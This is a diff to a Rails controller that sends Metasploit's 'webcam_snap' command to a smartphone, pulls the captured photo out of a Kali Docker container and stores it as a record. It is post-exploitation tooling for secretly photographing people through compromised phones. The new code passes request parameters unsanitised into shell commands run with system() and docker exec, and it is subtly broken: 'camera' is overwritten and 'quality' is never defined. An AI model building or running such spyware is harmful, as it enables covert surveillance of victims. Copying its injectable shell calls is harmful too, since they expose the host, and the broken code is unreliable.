@@ -2,48 +2,50 @@ class PicturesController < InheritedResources::Base
 
     #handle no session issue!
     def take_picture
-        puts params[:open]
-        puts params[:download]
-        puts params[:exec_timeout]
-        puts params[:copy_timeout]
+        begin
+            fileName=params[:filename].to_s
+            commandTimeout=params[:exec_timeout].to_i
+            downloadTimeout=params[:copy_timeout].to_i
+            camera=params[:back_camera] == "true" ? '1' : '2'
+            camera=params[:quality].to_s
 
-        commandTimeout=20
-        downloadTimeout=20
-        @smartphone = Smartphone.find(params[:smartphone_id])
+            @smartphone = Smartphone.find(params[:smartphone_id])
+            currentTime = DateTime.now
+            currentTimeFormat=currentTime.strftime("%Y-%m-%d_%H--%M--%S")
+            @fileName= fileName.empty? ? "webcam_snap_" + currentTimeFormat + '.jpeg' : fileName + '.jpeg'
+            processCommand="webcam_snap -q #{quality} -i #{camera} -p #{@fileName}"
+            commandOutput=start_msf_process(processCommand)
 
-        currentTime = DateTime.now
-        currentTimeFormat=currentTime.strftime("%Y-%m-%d_%H--%M--%S")
-        @fileName= "webcam_snap_" + currentTimeFormat + '.jpeg'
-        processCommand="webcam_snap -q 100 -i 1 -p #{@fileName}"
-        commandOutput=start_msf_process(processCommand)
-        puts commandOutput
+            1.upto(commandTimeout) do |n|
+                if system("docker exec kali_container sh -c \"ls | grep #{@fileName}\"")
+                    break
+                else
+                    puts "Waiting ..."
+                end
+                sleep 1
+              end
+            copyPictureCommand="docker cp kali_container:/#{@fileName} app\\assets\\images\\files\\pictures\\#{@fileName}"
+            system(copyPictureCommand)
 
-        1.upto(commandTimeout) do |n|
-            if system("docker exec kali_container sh -c \"ls | grep #{@fileName}\"")
-                break
-            else
-                puts "Waiting ..."
+            fullPath="app\\assets\\images\\files\\pictures\\" + @fileName
+            isOperationSuccessful=false
+            1.upto(downloadTimeout) do |n|
+                if File.file?(fullPath)
+                    newPicture=Picture.new(:date => currentTimeFormat.gsub('_',' ').gsub('--',':'),:filename => @fileName, :smartphone_id => @smartphone.id)
+                    newPicture.save!
+                    isOperationSuccessful = true
+                    break
+                end
+                sleep 1
             end
-            sleep 1
-          end
-        copyPictureCommand="docker cp kali_container:/#{@fileName} app\\assets\\images\\files\\pictures\\#{@fileName}"
-        system(copyPictureCommand)
-
-        fullPath="app\\assets\\images\\files\\pictures\\" + @fileName
-        isOperationSuccessful=false
-        1.upto(downloadTimeout) do |n|
-            if File.file?(fullPath)
-                newPicture=Picture.new(:date => currentTimeFormat.gsub('_',' ').gsub('--',':'),:filename => @fileName, :smartphone_id => @smartphone.id)
-                newPicture.save!
-                isOperationSuccessful = true
-                break
-            end 
+            commandOutput=["Operation Failed"] if not isOperationSuccessful
+        rescue
+            puts "Error on webcam snap."
+            commandOutput=["Operation Failed"]
         end
-        commandOutput=["Operation Failed"] if not isOperationSuccessful
-
         respond_to do |format|
             format.js { render "take_picture", :locals => {:commandOutput => commandOutput, :fileName => @fileName}  }
-          end
+        end
     end
 
 
